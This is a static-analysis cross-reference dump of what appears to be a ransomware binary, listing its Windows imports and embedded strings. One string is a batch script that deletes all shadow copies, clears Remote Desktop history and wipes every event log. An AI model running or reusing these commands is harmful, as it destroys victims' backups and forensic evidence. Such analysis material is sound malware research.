reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40273b	0x4099e6	string	0x4026d0	UVW3
0x40274a	0x4010d0	import	0x4026d0	KERNEL32.dll.lstrlenW
0x402779	0x401104	import	0x4026d0	SHLWAPI.dll.StrStrA
0x4027a2	0x4010e8	import	0x4026d0	KERNEL32.dll.HeapCreate
0x4027af	0x4010e0	import	0x4026d0	KERNEL32.dll.HeapAlloc
0x4027c4	0x401114	import	0x4026d0	USER32.dll.wsprintfA
0x4027d1	0x4019dc	string	0x4026d0	taskkill /F /T /PID
0x4027d7	0x4010d8	import	0x4026d0	KERNEL32.dll.lstrcpyA
0x4027e3	0x4010d4	import	0x4026d0	KERNEL32.dll.lstrcatA
0x402806	0x4010cc	import	0x4026d0	KERNEL32.dll.CreateProcessA
0x402823	0x4010dc	import	0x4026d0	KERNEL32.dll.CloseHandle
0x402995	0x401030	import	0x402989	KERNEL32.dll.GetProcessHeap
0x40299c	0x4010e0	import	0x402989	KERNEL32.dll.HeapAlloc
0x4029a9	0x401030	import	0x4029a3	KERNEL32.dll.GetProcessHeap
0x4029b0	0x40102c	import	0x4029a3	KERNEL32.dll.HeapFree
0x4029bd	0x401030	import	0x4029b7	KERNEL32.dll.GetProcessHeap
0x4029c4	0x4010e0	import	0x4029b7	KERNEL32.dll.HeapAlloc
0x4029dc	0x401030	import	0x4029cb	KERNEL32.dll.GetProcessHeap
0x4029e3	0x401028	import	0x4029cb	KERNEL32.dll.HeapReAlloc
0x4029ec	0x401030	import	0x4029cb	KERNEL32.dll.GetProcessHeap
0x4029f3	0x4010e0	import	0x4029cb	KERNEL32.dll.HeapAlloc
0x403b44	0x403be8	string	0x403b16	+:;>\e
0x403b8c	0x403be8	string	0x403b16	+:;>\e
0x403bb1	0x403be8	string	0x403b16	+:;>\e
0x403bd1	0x403be8	string	0x403b16	+:;>\e
0x403dad	0x403de4	string	0x403c6e	][_^Y
0x403e74	0x403ec4	string	0x403e25	][_^Y
0x403e93	0x403ec4	string	0x403e25	][_^Y
0x403ead	0x403ec4	string	0x403e25	][_^Y
0x404028	0x40405e	string	0x403ff5	^][_
0x4043a3	0x4043d7	string	0x404362	^_][Y
0x40448d	0x401034	import	0x404468	KERNEL32.dll.lstrlenA
0x404625	0x404762	string	0x4045de	X_][
0x4047aa	0x4047eb	string	0x40476c	_^][
0x4047b9	0x4047eb	string	0x40476c	_^][
0x4047bd	0x4047eb	string	0x40476c	_^][
0x404896	0x40490f	string	0x40484d	_^][Y
0x4049b4	0x4049bd	string	0x404917	_^[Y
0x404c0d	0x404c22	string	0x404be1	;]\ft
0x404f77	0x404f8d	string	0x404f12	9|$\t
0x404fa9	0x405343	string	0x404f12	^[_]
0x406346	0x40635d	string	0x40630d	^]_[
0x406d0a	0x406d14	string	0x406cf6	UVWh
0x406e03	0x406dcd	string	0x406cf6	3ҍL$ blocks=Basic Latin,Cyrillic
0x406e1d	0x406db3	string	0x406cf6	3\r|$
0x406ff2	0x40700c	string	0x406f67	j\bY3\r|$
0x4071ad	0x401018	import	0x407194	ADVAPI32.dll.CryptAcquireContextW
0x4071c7	0x401010	import	0x407194	ADVAPI32.dll.CryptGenRandom
0x4071d5	0x401014	import	0x407194	ADVAPI32.dll.CryptReleaseContext
0x4071de	0x4071ea	string	0x407194	^_[]
0x4071e0	0x401014	import	0x407194	ADVAPI32.dll.CryptReleaseContext
0x407204	0x401cb8	string	0x407194	SHA224
0x407224	0x401cc0	string	0x407194	SHA256
0x4076f2	0x401fc4	string	0x407629	%d.%d
0x407779	0x40776a	string	0x407629	]_^[
0x408424	0x40847c	string	0x408373	[_^]
0x408465	0x40847c	string	0x408373	[_^]
0x408475	0x40847c	string	0x408373	[_^]
0x408718	0x408778	string	0x408636	9\$,u\rUUW
0x408786	0x408845	string	0x408636	^]_[
0x4087bb	0x408845	string	0x408636	^]_[
0x40883e	0x408845	string	0x408636	^]_[
0x4088f4	0x408aa3	string	0x408884	^_][
0x40897e	0x408aa3	string	0x408884	^_][
0x408a83	0x408aa3	string	0x408884	^_][
0x408a95	0x408aa3	string	0x408884	^_][
0x408a9c	0x408aa3	string	0x408884	^_][
0x408cbf	0x408d70	string	0x408c9d	_^][
0x408cd2	0x408d70	string	0x408c9d	_^][
0x408ce8	0x408d70	string	0x408c9d	_^][
0x408cf6	0x408d70	string	0x408c9d	_^][
0x408d1b	0x408d70	string	0x408c9d	_^][
0x408d30	0x408d70	string	0x408c9d	_^][
0x408d57	0x408d70	string	0x408c9d	_^][
0x408d69	0x408d70	string	0x408c9d	_^][
0x4092ac	0x401048	import	0x40928f	KERNEL32.dll.SetFilePointerEx
0x4092b6	0x401038	import	0x40928f	KERNEL32.dll.GetLastError
0x40930b	0x402118	string	0x4092d3	{%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}
0x409314	0x401114	import	0x4092d3	USER32.dll.wsprintfA
0x409321	0x401034	import	0x4092d3	KERNEL32.dll.lstrlenA
0x40933f	0x4099e6	string	0x40932b	UVW3
0x40936e	0x4010f0	import	0x40932b	RPCRT4.dll.UuidCreate
0x4093a3	0x40104c	import	0x40932b	KERNEL32.dll.CreateFileW
0x4093a9	0x401040	import	0x40932b	KERNEL32.dll.WriteFile
0x4093c0	0x40103c	import	0x40932b	KERNEL32.dll.GetFileSizeEx
0x4093e4	0x401034	import	0x40932b	KERNEL32.dll.lstrlenA
0x40946d	0x401034	import	0x40932b	KERNEL32.dll.lstrlenA
0x4095b9	0x401044	import	0x40932b	KERNEL32.dll.ReadFile
0x409640	0x401044	import	0x40932b	KERNEL32.dll.ReadFile
0x40974d	0x401034	import	0x40932b	KERNEL32.dll.lstrlenA
0x40975f	0x4010dc	import	0x40932b	KERNEL32.dll.CloseHandle
0x4097fc	0x401034	import	0x40979b	KERNEL32.dll.lstrlenA
0x409807	0x401034	import	0x40979b	KERNEL32.dll.lstrlenA
0x409815	0x401034	import	0x40979b	KERNEL32.dll.lstrlenA
0x409826	0x401034	import	0x40979b	KERNEL32.dll.lstrlenA
0x40982f	0x4010e4	import	0x40979b	KERNEL32.dll.lstrcmpiA
0x409908	0x40108c	import	0x4098d3	KERNEL32.dll.CreateProcessW
0x409927	0x4010b8	import	0x409915	KERNEL32.dll.MultiByteToWideChar
0x40994b	0x4010b8	import	0x409915	KERNEL32.dll.MultiByteToWideChar
0x409978	0x401098	import	0x409958	KERNEL32.dll.GetTempFileNameW
0x40997e	0x402550	string	0x409958	.bat
0x40998a	0x401084	import	0x409958	KERNEL32.dll.lstrcatW
0x4099a6	0x40104c	import	0x409958	KERNEL32.dll.CreateFileW
0x4099b7	0x402388	string	0x409958	@echo off\r\nvssadmin.exe Delete Shadows /All /Quiet\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f\r\nreg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"\r\ncd %userprofile%\documents\\r\nattrib Default.rdp -s -h\r\ndel Default.rdp \r\nfor /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
0x4099be	0x401034	import	0x409958	KERNEL32.dll.lstrlenA
0x4099c7	0x401040	import	0x409958	KERNEL32.dll.WriteFile
0x4099ce	0x4010dc	import	0x409958	KERNEL32.dll.CloseHandle
0x4099fa	0x4010bc	import	0x4099e6	KERNEL32.dll.WideCharToMultiByte
0x409a1a	0x4010bc	import	0x4099e6	KERNEL32.dll.WideCharToMultiByte
0x409a61	0x401088	import	0x409a28	KERNEL32.dll.GetModuleFileNameW
0x409a77	0x40255c	string	0x409a28	COMSPEC
0x409a7c	0x401090	import	0x409a28	KERNEL32.dll.GetEnvironmentVariableW
0x409a8a	0x401084	import	0x409a28	KERNEL32.dll.lstrcatW
0x409a96	0x40256c	string	0x409a28	/c del
0x409aae	0x40257c	string	0x409a28	> nul
0x409adf	0x40258c	string	0x409a28	Open
0x409aef	0x4010fc	import	0x409a28	SHELL32.dll.ShellExecuteExW
0x409afd	0x4010b4	import	0x409a28	KERNEL32.dll.SetPriorityClass
0x409b0b	0x401050	import	0x409a28	KERNEL32.dll.GetCurrentProcess
0x409b17	0x401058	import	0x409a28	KERNEL32.dll.GetCurrentThread
0x409b1e	0x40105c	import	0x409a28	KERNEL32.dll.SetThreadPriority
0x409b42	0x4010a0	import	0x409b3e	KERNEL32.dll.GetFileAttributesW
0x409b5e	0x40110c	import	0x409b55	SHLWAPI.dll.PathRemoveFileSpecW
0x409b64	0x401084	import	0x409b55	KERNEL32.dll.lstrcatW
0x409b97	0x40104c	import	0x409b55	KERNEL32.dll.CreateFileW
0x409bb2	0x401034	import	0x409b55	KERNEL32.dll.lstrlenA
0x409bc0	0x401040	import	0x409b55	KERNEL32.dll.WriteFile
0x409bc7	0x4010dc	import	0x409b55	KERNEL32.dll.CloseHandle
0x409bf2	0x40aaa9	string	0x409bd4	VWj\b
0x409c09	0x401084	import	0x409bd4	KERNEL32.dll.lstrcatW
0x409c12	0x401078	import	0x409bd4	KERNEL32.dll.lstrcmpiW
0x409c32	0x4010d0	import	0x409bd4	KERNEL32.dll.lstrlenW
0x409c5a	0x4010a4	import	0x409bd4	KERNEL32.dll.FindFirstFileW
0x409cb3	0x4099e6	string	0x409bd4	UVW3
0x409ced	0x40aaa9	string	0x409bd4	VWj\b
0x409d35	0x401108	import	0x409bd4	SHLWAPI.dll.PathFindFileNameW
0x409d5f	0x40109c	import	0x409bd4	KERNEL32.dll.SetFileAttributesW
0x409d9d	0x401080	import	0x409bd4	KERNEL32.dll.lstrcpyW
0x409dc5	0x4010b0	import	0x409bd4	KERNEL32.dll.MoveFileExW
0x409de9	0x4010a8	import	0x409bd4	KERNEL32.dll.FindNextFileW
0x409df8	0x401070	import	0x409bd4	KERNEL32.dll.FindClose
0x409e2d	0x401030	import	0x409e1d	KERNEL32.dll.GetProcessHeap
0x409e34	0x4010e0	import	0x409e1d	KERNEL32.dll.HeapAlloc
0x409e3c	0x401064	import	0x409e1d	KERNEL32.dll.GetLogicalDrives
0x409e75	0x401094	import	0x409e1d	KERNEL32.dll.GetDriveTypeA
0x409e95	0x401030	import	0x409e1d	KERNEL32.dll.GetProcessHeap
0x409e9c	0x4010e0	import	0x409e1d	KERNEL32.dll.HeapAlloc
0x409ead	0x4010d8	import	0x409e1d	KERNEL32.dll.lstrcpyA
0x409ec8	0x4010e4	import	0x409e1d	KERNEL32.dll.lstrcmpiA
0x409f0a	0x401034	import	0x409eef	KERNEL32.dll.lstrlenA
0x409f2a	0x4010e8	import	0x409eef	KERNEL32.dll.HeapCreate
0x409f3a	0x4010e0	import	0x409eef	KERNEL32.dll.HeapAlloc
0x409f9e	0x401020	import	0x409f7d	ADVAPI32.dll.RegOpenKeyExW
0x409fbe	0x40261c	string	0x409f7d	CertificatesCheck
0x409fcb	0x401000	import	0x409f7d	ADVAPI32.dll.RegQueryValueExW
0x409fdd	0x401078	import	0x409f7d	KERNEL32.dll.lstrcmpiW
0x409ff9	0x401004	import	0x409f7d	ADVAPI32.dll.RegCreateKeyExW
0x40a00a	0x4010d0	import	0x409f7d	KERNEL32.dll.lstrlenW
0x40a022	0x40101c	import	0x409f7d	ADVAPI32.dll.RegSetValueExW
0x40a02c	0x401008	import	0x409f7d	ADVAPI32.dll.RegCloseKey
0x40a058	0x40104c	import	0x40a03f	KERNEL32.dll.CreateFileW
0x40a065	0x401038	import	0x40a03f	KERNEL32.dll.GetLastError
0x40a06e	0x401038	import	0x40a03f	KERNEL32.dll.GetLastError
0x40a0a9	0x4010d8	import	0x40a03f	KERNEL32.dll.lstrcpyA
0x40a0b4	0x40106c	import	0x40a03f	KERNEL32.dll.SetFilePointer
0x40a0cc	0x401040	import	0x40a03f	KERNEL32.dll.WriteFile
0x40a0e1	0x4010dc	import	0x40a03f	KERNEL32.dll.CloseHandle
0x40a1a1	0x401088	import	0x40a150	KERNEL32.dll.GetModuleFileNameW
0x40a1a7	0x401090	import	0x40a150	KERNEL32.dll.GetEnvironmentVariableW
0x40a1b4	0x402640	string	0x40a150	temp
0x40a1d0	0x40107c	import	0x40a150	KERNEL32.dll.lstrcpynA
0x40a21f	0x409eef	string	0x40a150	SUVW
0x40a23d	0x409eef	string	0x40a150	SUVW
0x40a25b	0x409eef	string	0x40a150	SUVW
0x40a278	0x40264c	string	0x40a150	appdata
0x40a285	0x401054	import	0x40a150	KERNEL32.dll.ExitProcess
0x40a28b	0x401084	import	0x40a150	KERNEL32.dll.lstrcatW
0x40a2a6	0x401108	import	0x40a150	SHLWAPI.dll.PathFindFileNameW
0x40a2c5	0x401078	import	0x40a150	KERNEL32.dll.lstrcmpiW
0x40a2ef	0x4010ac	import	0x40a150	KERNEL32.dll.CopyFileW
0x40a312	0x40265c	string	0x40a150	public
0x40a31f	0x40266c	string	0x40a150	ALLUSERSPROFILE
0x40a32c	0x401054	import	0x40a150	KERNEL32.dll.ExitProcess
0x40a33f	0x401080	import	0x40a150	KERNEL32.dll.lstrcpyW
0x40a36f	0x40100c	import	0x40a150	ADVAPI32.dll.GetCurrentHwProfileW
0x40a3d3	0x40a03f	string	0x40a150	QQSW3
0x40a3e4	0x401060	import	0x40a150	KERNEL32.dll.Sleep
0x40a42c	0x40268c	string	0x40a150	{{IDENTIFIER}}
0x40a433	0x401104	import	0x40a150	SHLWAPI.dll.StrStrA
0x40a444	0x401034	import	0x40a150	KERNEL32.dll.lstrlenA
0x40a4a7	0x401068	import	0x40a150	KERNEL32.dll.GetStdHandle
0x40a5d7	0x401034	import	0x40a5d0	KERNEL32.dll.lstrlenA
0x40a656	0x401034	import	0x40a605	KERNEL32.dll.lstrlenA
0x40a680	0x401040	import	0x40a605	KERNEL32.dll.WriteFile
0x40a782	0x4026a4	string	0x40a729	rsa_encrypt
0x40a788	0x401034	import	0x40a729	KERNEL32.dll.lstrlenA
0x40a8a6	0x4026b0	string	0x40a869	rsa_genkey
0x40a8ac	0x401034	import	0x40a869	KERNEL32.dll.lstrlenA
0x40aa97	0x40a6b6	string	0x40a869	SUVW
0x40aafb	0x401080	import	0x40aade	KERNEL32.dll.lstrcpyW
0x40ab28	0x4010d0	import	0x40ab23	KERNEL32.dll.lstrlenW
0x40ab43	0x401080	import	0x40ab23	KERNEL32.dll.lstrcpyW
0x40ab50	0x4010c8	import	0x40ab50	KERNEL32.dll.CreateToolhelp32Snapshot
0x40ab56	0x4010c4	import	0x40ab56	KERNEL32.dll.Process32FirstW
0x40ab5c	0x401074	import	0x40ab5c	KERNEL32.dll.Process32NextW
0x40ab62	0x4010f8	import	0x40ab62	SHELL32.dll.SHChangeNotify
0x40ab68	0x401124	import	0x40ab68	ntdll.dll._aulldiv
0x40ab6e	0x401120	import	0x40ab6e	ntdll.dll._alldiv
0x40ab74	0x40111c	import	0x40ab74	ntdll.dll._allrem
0x40f79f	0x40f814	string	0x40ab74	GetFileSizeEx
0x40f80c	0x40f880	string	0x40ab74	GetCurrentThread
0x40f816	0x40f85e	string	0x40ab74	GetCurrentProcess
0x40f8c8	0x40f92e	string	0x40ab74	GetModuleFileNameW
0x40f9c8	0x40fa10	string	0x40ab74	MultiByteToWideChar
0x40fa16	0x40fa8c	string	0x40ab74	CryptReleaseContext
0x40fa3f	0x40faa2	string	0x40ab74	CryptGenRandom
0x40fb6c	0x40fbd6	string	0x40ab74	RPCRT4.dll
0x40fc45	0x40fcb7	string	0x40ab74	Np1a
0x40fdf5	0x40fe47	string	0x40ab74	p)L|~R
0x41014d	0x41011e	string	0x40ab74	]SY3%,
